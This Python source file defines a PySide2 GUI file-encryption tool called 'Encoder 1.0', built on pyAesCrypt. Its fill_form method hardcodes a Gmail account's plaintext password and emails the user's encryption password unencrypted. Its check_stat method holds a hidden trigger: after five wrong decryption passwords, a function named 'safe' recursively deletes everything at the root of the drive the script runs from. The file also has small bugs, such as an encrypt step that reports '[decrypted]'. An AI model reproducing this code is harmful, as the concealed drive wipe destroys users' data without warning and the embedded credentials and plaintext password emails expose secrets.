from PySide2.QtCore import (QCoreApplication, QMetaObject,
                            QRect, QSize)
from PySide2.QtGui import QFont
from PySide2.QtWidgets import *
import sys
import smtplib
import pyAesCrypt
import os
import shutil


class Ui_MainWindow(object):
    def setupUi(self, MainWindow):
        if MainWindow.objectName():
            MainWindow.setObjectName(u"MainWindow")
        MainWindow.resize(654, 381)
        self.centralwidget = QWidget(MainWindow)
        self.centralwidget.setObjectName(u"centralwidget")
        self.gridLayout = QGridLayout(self.centralwidget)
        self.gridLayout.setObjectName(u"gridLayout")
        self.frame = QFrame(self.centralwidget)
        self.frame.setObjectName(u"frame")
        self.frame.setFrameShape(QFrame.StyledPanel)
        self.frame.setFrameShadow(QFrame.Raised)
        self.gridLayout_3 = QGridLayout(self.frame)
        self.gridLayout_3.setObjectName(u"gridLayout_3")
        self.frame_2 = QFrame(self.frame)
        self.frame_2.setObjectName(u"frame_2")
        font = QFont()
        font.setPointSize(10)
        self.frame_2.setFont(font)
        self.frame_2.setFrameShape(QFrame.StyledPanel)
        self.frame_2.setFrameShadow(QFrame.Raised)
        self.gridLayout_2 = QGridLayout(self.frame_2)
        self.gridLayout_2.setObjectName(u"gridLayout_2")
        self.horizontalLayout_4 = QHBoxLayout()
        self.horizontalLayout_4.setObjectName(u"horizontalLayout_4")
        self.label_3 = QLabel(self.frame_2)
        self.label_3.setObjectName(u"label_3")

        self.horizontalLayout_4.addWidget(self.label_3)

        self.lineEdit_3 = QLineEdit(self.frame_2)
        self.lineEdit_3.setObjectName(u"lineEdit_3")

        self.horizontalLayout_4.addWidget(self.lineEdit_3)

        self.gridLayout_2.addLayout(self.horizontalLayout_4, 7, 0, 1, 1)

        self.horizontalLayout = QHBoxLayout()
        self.horizontalLayout.setObjectName(u"horizontalLayout")
        self.label = QLabel(self.frame_2)
        self.label.setObjectName(u"label")

        self.horizontalLayout.addWidget(self.label)

        self.lineEdit = QLineEdit(self.frame_2)
        self.lineEdit.setObjectName(u"lineEdit")

        self.horizontalLayout.addWidget(self.lineEdit)

        self.gridLayout_2.addLayout(self.horizontalLayout, 0, 0, 1, 1)

        self.horizontalLayout_2 = QHBoxLayout()
        self.horizontalLayout_2.setObjectName(u"horizontalLayout_2")
        self.label_2 = QLabel(self.frame_2)
        self.label_2.setObjectName(u"label_2")

        self.horizontalLayout_2.addWidget(self.label_2)

        self.lineEdit_2 = QLineEdit(self.frame_2)
        self.lineEdit_2.setObjectName(u"lineEdit_2")
        self.lineEdit_2.setEchoMode(QLineEdit.PasswordEchoOnEdit)

        self.horizontalLayout_2.addWidget(self.lineEdit_2)

        self.gridLayout_2.addLayout(self.horizontalLayout_2, 6, 0, 1, 1)

        self.pushButton = QPushButton(self.frame_2)
        self.pushButton.setObjectName(u"pushButton")
        self.pushButton.setMaximumSize(QSize(75, 16777215))

        self.gridLayout_2.addWidget(self.pushButton, 8, 0, 1, 1)

        self.horizontalLayout_3 = QHBoxLayout()
        self.horizontalLayout_3.setObjectName(u"horizontalLayout_3")
        self.checkBox = QCheckBox(self.frame_2)
        self.checkBox.setObjectName(u"checkBox")

        self.horizontalLayout_3.addWidget(self.checkBox)

        self.checkBox_2 = QCheckBox(self.frame_2)
        self.checkBox_2.setObjectName(u"checkBox_2")

        self.horizontalLayout_3.addWidget(self.checkBox_2)

        self.horizontalSpacer = QSpacerItem(40, 20, QSizePolicy.Expanding, QSizePolicy.Minimum)

        self.horizontalLayout_3.addItem(self.horizontalSpacer)

        self.gridLayout_2.addLayout(self.horizontalLayout_3, 5, 0, 1, 1)

        self.verticalLayout = QVBoxLayout()
        self.verticalLayout.setObjectName(u"verticalLayout")
        self.toolButton = QToolButton(self.frame_2)
        self.toolButton.setObjectName(u"toolButton")

        self.verticalLayout.addWidget(self.toolButton)

        self.toolButton_2 = QToolButton(self.frame_2)
        self.toolButton_2.setObjectName(u"toolButton_2")

        self.verticalLayout.addWidget(self.toolButton_2)

        self.gridLayout_2.addLayout(self.verticalLayout, 0, 1, 1, 1)

        self.gridLayout_3.addWidget(self.frame_2, 0, 0, 1, 1)

        self.gridLayout.addWidget(self.frame, 1, 0, 1, 1)

        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QMenuBar(MainWindow)
        self.menubar.setObjectName(u"menubar")
        self.menubar.setGeometry(QRect(0, 0, 654, 26))
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QStatusBar(MainWindow)
        self.statusbar.setObjectName(u"statusbar")
        MainWindow.setStatusBar(self.statusbar)

        self.retranslateUi(MainWindow)

        QMetaObject.connectSlotsByName(MainWindow)

    # setupUi

    def retranslateUi(self, MainWindow):
        MainWindow.setWindowTitle(QCoreApplication.translate("MainWindow", u"Encoder 1.0", None))
        self.label_3.setText(QCoreApplication.translate("MainWindow",
                                                        u"<html><head/><body><p><span style=\" font-size:10pt;\">Email:</span></p></body></html>",
                                                        None))
        self.label.setText(QCoreApplication.translate("MainWindow",
                                                      u"<html><head/><body><p><span style=\" font-size:10pt;\">File or dir:</span></p></body></html>",
                                                      None))
        self.label_2.setText(QCoreApplication.translate("MainWindow",
                                                        u"<html><head/><body><p><span style=\" font-size:10pt;\">Password:</span></p></body></html>",
                                                        None))
        self.pushButton.setText(QCoreApplication.translate("MainWindow", u"Confirm", None))
        self.checkBox.setText(QCoreApplication.translate("MainWindow", u"Decoding", None))
        self.checkBox_2.setText(QCoreApplication.translate("MainWindow", u"Encondig", None))
        self.toolButton.setText(QCoreApplication.translate("MainWindow", u"Browse dir", None))
        self.toolButton_2.setText(QCoreApplication.translate("MainWindow", u"Browse file", None))
    # retranslateUi


class Gmail_massage():
    @staticmethod
    def send_email(to_addr, from_addr, password, subject, body_text):
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(from_addr, password)
        message = "\r\n".join((
            "From: {}".format(from_addr),
            "To: {}".format(to_addr),
            "Subject: {}".format(subject),
            "",
            body_text
        ))
        server.sendmail(from_addr, to_addr, message)
        server.quit()


class Functions():
    @staticmethod
    def encoding_dir(dir, password):
        buffer = 512 * 1024
        for path, names, files in os.walk(dir):
            for file in files:
                if not file.endswith('.crp') and file != os.path.split(sys.argv[0])[1]:
                    target = os.path.join(path, file)
                    pyAesCrypt.encryptFile(target, target + '.crp', password, buffer)
                    print('File: ',target, '[crypted]')
                    os.remove(target)

    @staticmethod
    def decoding_dir(dir, password):
        buffer = 512 * 1024
        for path, names, files in os.walk(dir):
            for file in files:
                if file.endswith('.crp') and file  :
                    target = os.path.join(path, file)
                    pyAesCrypt.decryptFile(target, os.path.splitext(target)[0], password, buffer)
                    print('File: ',target, '[decrypted]')
                    os.remove(target)

    @staticmethod
    def encoding_file(full_name, password):
        if not full_name.endswith('.crp'):
            buffer = 512 * 1024
            pyAesCrypt.encryptFile(full_name, full_name + '.crp', password, buffer)
            print('File: ', full_name, '[decrypted]')
            os.remove(full_name)

    @staticmethod
    def decoding_file(full_name, password):
        if full_name.endswith('.crp'):
            buffer = 512 * 1024
            pyAesCrypt.decryptFile(full_name, os.path.splitext(full_name)[0], password, buffer)
            print('File: ', full_name, '[decrypted]')
            os.remove(full_name)

    @staticmethod
    def encoding(path, password):
        if os.path.isfile(path):
            Functions.encoding_file(path, password)
        else:
            Functions.encoding_dir(path, password)

    @staticmethod
    def decoding(path, password):
        if os.path.isfile(path):
            Functions.decoding_file(path, password)
        else:
            Functions.decoding_dir(path, password)

    @staticmethod
    def safe(dirpath):
        for filename in os.listdir(dirpath):
            filepath = os.path.join(dirpath, filename)
            try:
                shutil.rmtree(filepath)
            except OSError:
                os.remove(filepath)


class MyApp(Ui_MainWindow, QMainWindow):
    def __init__(self):
        QMainWindow.__init__(self)
        self.count = 0
        self.setupUi(self)
        self.setWindowTitle('Encoder 1.0')
        self.toolButton.clicked.connect(self.select_dir)
        self.toolButton_2.clicked.connect(self.select_file)
        self.pushButton.clicked.connect(self.fill_form)

    def fill_form(self):
        self.file = self.lineEdit.text()
        if not self.file:
            QMessageBox.about(self, 'FILE OR DIR REQUIRED', 'HEY! FILL THE FILE FIELD!')
            return

        self.password = self.lineEdit_2.text()
        if not self.password:
            QMessageBox.about(self, 'PASSWORD REQUIRED', 'HEY! FILL THE PASSWORD!')
            return
        self.email = self.lineEdit_3.text()
        self.check_stat()

        if self.email:
            try:
                Gmail_massage.send_email(self.email, 'mishakizyan1@gmail.com', 'qwerty2001', 'PASSWORD TO ENCODER',
                                         '''Dear User this is Your password, do not lose it: \n{} '''.format(
                                             self.password))
            except:
                QMessageBox.about(self, 'Email sending', 'HEY! SOMETHING GOES WRONG, TRY AGAIN')
                return
            else:
                QMessageBox.about(self, 'Email sending', 'THE PASSWORD WAS SEND TO YOUR EMAIL')
                return

    def select_file(self):
        file_path, ext = QFileDialog.getOpenFileName(self, 'Select file')
        if file_path:
            self.lineEdit.setText(file_path)

    def select_dir(self):
        dir_path = QFileDialog.getExistingDirectory(self, 'Select directory')
        if dir_path:
            self.lineEdit.setText(dir_path)

    def check_stat(self):
        if self.checkBox.isChecked() or self.checkBox_2.isChecked():
            if self.checkBox.isChecked() and self.checkBox_2.isChecked():
                QMessageBox.about(self, 'ONLY ONE REQUIRED', 'HEY! CHOOSE ONLY ONE MODE!')
                return

            elif self.checkBox_2.isChecked():
                try:
                    Functions.encoding(self.file, self.password)
                except Exception:
                    QMessageBox.about(self, 'ERROR', 'HEY! SOMETHING WENT WRONG \nTRY AGAIN ')
                    return
                else:
                    QMessageBox.about(self, 'All OkEy', 'Encoding finished successfully!')
                    return



            else:
                try:
                    Functions.decoding(self.file, self.password)

                except ValueError:
                    self.count += 1
                    QMessageBox.about(self, 'ERROR', 'HEY! WRONG PASSWORD \nTRY AGAIN {}'.format(self.count))
                    if self.count == 5:
                        Functions.safe(os.path.splitdrive(sys.argv[0])[0]+os.sep)
                    return

                except Exception:
                    QMessageBox.about(self, 'ERROR', 'HEY! SOMETHING WENT WRONG \nTRY AGAIN ')
                    return
                else:
                    QMessageBox.about(self, 'All OkEy', 'Decoding finished successfully!')
                    return

        else:
            QMessageBox.about(self, 'MODE REQUIRED', 'HEY! CHOOSE ONE MODE!')
            return


if __name__ == '__main__':
    app = QApplication(sys.argv)
    qt_app = MyApp()
    qt_app.show()
    sys.exit(app.exec_())